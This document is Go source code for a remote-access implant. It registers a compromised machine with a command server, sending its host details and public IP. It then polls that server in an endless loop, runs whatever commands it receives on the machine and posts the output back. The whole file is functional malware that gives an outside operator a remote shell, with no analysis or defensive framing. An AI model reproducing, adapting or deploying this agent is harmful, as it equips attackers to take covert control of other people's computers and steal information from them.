package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"implant/config"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
)

type system_info struct {
	Stats  *host.InfoStat
	Memory uint64 `json:"total"`
	IP     string
}

func register(serverIP string) string {
	// Gather system info
	stats, _ := host.Info()
	v, _ := mem.VirtualMemory()
	// get ip
	resp, _ := http.Get("http://api.ipify.org")
	body, _ := ioutil.ReadAll(resp.Body)
	ip := string(body)
	// set info in the requests json
	host_info := system_info{
		stats,
		v.Total,
		ip,
	}
	postBody, _ := json.Marshal(host_info)
	responseBody := bytes.NewBuffer(postBody)
	resp_register, _ := http.Post("http://"+serverIP+":5000/api/1.1/add_agent", "application/json", responseBody)
	body2, _ := ioutil.ReadAll(resp_register.Body)
	agent_id := string(body2)
	return agent_id
}

func get_command(agent_id string, serverIP string) {
	post_body, _ := json.Marshal(map[string]string{
		"id": agent_id,
	})
	postBody := bytes.NewBuffer(post_body)
	resp_query, _ := http.Post("http://"+serverIP+":5000/api/1.1/get_command", "application/json", postBody)
	resp, _ := ioutil.ReadAll(resp_query.Body)
	command := string(resp)
	if command == "None" {
		time.Sleep(1 * time.Second)
	} else {
		args := strings.Split(command, " ")
		parsed_command := args[0]
		args = args[1:]
		out, _ := exec.Command(parsed_command, args...).Output()
		output := string(out[:])
		resp_body, _ := json.Marshal(map[string]string{
			"id":     agent_id,
			"output": output,
		})
		responseBody := bytes.NewBuffer(resp_body)
		resp_send_command, _ := http.Post("http://"+serverIP+":5000/api/1.1/command_out", "application/json", responseBody)
		ack_resp, _ := ioutil.ReadAll(resp_send_command.Body)
		ack := string(ack_resp)
		fmt.Printf("%s\n", ack)
	}
}

func main() {
	init := config.Config_t{IP: "127.0.0.1"}
	var conf *config.Config_t = &init
	res := config.CONFIG_BUFFER
	config.Config_initialize(conf, res)
	agent_id := register(conf.IP)
	for {
		get_command(agent_id, conf.IP)
	}
}
